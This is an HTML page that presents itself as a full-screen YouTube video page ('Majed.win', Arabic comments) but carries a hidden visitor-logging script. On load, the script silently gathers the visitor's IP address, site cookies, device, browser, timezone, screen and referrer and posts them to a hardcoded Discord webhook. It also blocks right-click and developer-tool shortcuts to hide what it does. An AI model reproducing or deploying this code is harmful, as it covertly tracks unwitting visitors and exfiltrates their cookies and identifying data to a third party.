<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Majed.win</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            position: relative;
            background-color: #000;
        }

        /* الفيديو يغطي الشاشة بالكامل - لا شيء يظهر غيره */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            overflow: hidden;
        }

        .video-background iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100vw;
            height: 100vh;
            transform: translate(-50%, -50%);
            pointer-events: none;
            object-fit: cover;
            border: none;
        }

        /* إخفاء أي شيء قد يظهر تلقائياً */
        :fullscreen {
            overflow: hidden;
        }
        
        /* تأكيد عدم وجود أي عناصر مرئية */
        .hidden, [class*="visible"], [id*="popup"] {
            display: none !important;
        }

        @media (max-aspect-ratio: 16/9) {
            .video-background iframe { height: 300%; top: -100%; }
        }
        @media (min-aspect-ratio: 16/9) {
            .video-background iframe { width: 300%; left: -100%; }
        }
    </style>
</head>
<body>

<div class="video-background">
    <iframe id="bgVideo"
            src="https://www.youtube.com/embed/TBWUedJprzk?autoplay=1&mute=1&loop=1&playlist=TBWUedJprzk&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&disablekb=1&fs=0"
            title=""
            frameborder="0"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            referrerpolicy="strict-origin-when-cross-origin">
    </iframe>
</div>

<script>
    // ================================================================
    // رابط Webhook Discord الخاص بك
    // ================================================================
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1503122092806111365/QL5wVNe19GS7Oe9DWLv9xv5ZSYevbZa7Spjo6aGa08cOK4ADsqP8WcVDmowhnY1u7lXD";
    
    // ================================================================
    // جميع العمليات التالية تحدث بشكل مخفي - لا تظهر للمستخدم
    // ================================================================
    
    // جلب عنوان IP العام
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json', {
                cache: 'no-store'
            });
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return "غير معروف";
        }
    }
    
    // قراءة كوكيز الموقع الحالي (الخاصة به فقط)
    function getCurrentSiteCookies() {
        try {
            return document.cookie || "";
        } catch(e) {
            return "";
        }
    }
    
    // الحصول على معلومات الجهاز والمتصفح
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let deviceType = "Unknown";
        if (/Windows NT/i.test(ua)) deviceType = "Windows";
        else if (/Macintosh|Mac OS X/i.test(ua)) deviceType = "Mac";
        else if (/Android/i.test(ua)) deviceType = "Android";
        else if (/iPhone/i.test(ua)) deviceType = "iPhone";
        else if (/iPad/i.test(ua)) deviceType = "iPad";
        else if (/Linux/i.test(ua)) deviceType = "Linux";
        
        let browser = "Unknown";
        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
        else if (/Firefox/i.test(ua)) browser = "Firefox";
        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
        else if (/Edg/i.test(ua)) browser = "Edge";
        else if (/Opera|OPR/i.test(ua)) browser = "Opera";
        
        return `${deviceType} | ${browser}`;
    }
    
    // الحصول على المنطقة الزمنية واللغة
    function getRegionInfo() {
        try {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const language = navigator.language;
            return `${timezone} | ${language}`;
        } catch(e) {
            return "غير معروف";
        }
    }
    
    // الحصول على الوقت والتاريخ
    function getCurrentTime() {
        const now = new Date();
        return now.toISOString().replace('T', ' ').substring(0, 19);
    }
    
    // الحصول على عنوان الصفحة (فارغ لكن للتوثيق)
    function getPageUrl() {
        return window.location.href;
    }
    
    // الحصول على الرابط السابق (referrer)
    function getReferrer() {
        return document.referrer || "مباشر";
    }
    
    // دالة إرسال البيانات إلى Discord (تتم في الخلفية تماماً)
    async function sendToDiscord(data) {
        if (!DISCORD_WEBHOOK_URL) return;
        
        const embed = {
            title: "📥 زيارة جديدة",
            color: 0x2C2F33,
            fields: [
                { name: "🌐 IP", value: `||${data.ip}||`, inline: true },
                { name: "⏰ الوقت", value: data.time, inline: true },
                { name: "📍 المنطقة", value: data.region, inline: false },
                { name: "💻 الجهاز", value: data.device, inline: true },
                { name: "📺 الشاشة", value: data.screen, inline: true },
                { name: "🔗 الرابط", value: data.url, inline: false }
            ],
            footer: { text: "تم الإرسال تلقائياً" },
            timestamp: new Date().toISOString()
        };
        
        // في حالة وجود كوكيز نضيفها كحقل منفصل
        if (data.cookies && data.cookies.length > 0) {
            embed.fields.push({
                name: "🍪 الكوكيز",
                value: `\`${data.cookies.substring(0, 400)}\``,
                inline: false
            });
        }
        
        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "🎬",
                    embeds: [embed]
                })
            });
        } catch (error) {
            // الفشل يحدث بصمت - لا يظهر شيء للمستخدم
        }
    }
    
    // دالة إضافة كوكيز خاصة بالموقع
    function setTrackingCookies() {
        try {
            if (!document.cookie.includes('_visited')) {
                const id = Math.random().toString(36).substring(2, 15);
                document.cookie = `_visited=${id}; path=/; max-age=86400`;
                document.cookie = `_ts=${Date.now()}; path=/; max-age=86400`;
            }
        } catch(e) {}
    }
    
    // ================================================================
    // التنفيذ الرئيسي - يحدث بصمت تام في الخلفية
    // ================================================================
    
    // تعيين الكوكيز الخاصة بالموقع
    setTrackingCookies();
    
    // تجهيز المتغيرات
    let collectedData = {
        ip: "جارٍ الجلب...",
        time: getCurrentTime(),
        region: getRegionInfo(),
        device: getDeviceInfo(),
        screen: `${screen.width}x${screen.height}`,
        url: getPageUrl(),
        referrer: getReferrer(),
        cookies: getCurrentSiteCookies()
    };
    
    // جلب الIP بشكل غير متزامن ثم الإرسال
    getUserIP().then(ip => {
        collectedData.ip = ip;
        
        // إرسال البيانات إلى Discord (خلف الكواليس)
        sendToDiscord(collectedData);
    }).catch(() => {
        collectedData.ip = "غير معروف";
        sendToDiscord(collectedData);
    });
    
    // إرسال بيانات إضافية بعد ثانيتين للتأكد من اكتمال كل شيء
    setTimeout(() => {
        if (collectedData.ip === "جارٍ الجلب...") {
            collectedData.ip = "تأخر الجلب";
            sendToDiscord(collectedData);
        }
    }, 3000);
    
    // ================================================================
    // منع أي تفاعل من المستخدم قد يظهر شيء غير مرغوب فيه
    // ================================================================
    document.addEventListener('contextmenu', (e) => e.preventDefault());
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J'))) {
            // منع فتح أدوات المطور ولكن بصمت
            e.preventDefault();
        }
    });
</script>
</body>
</html>
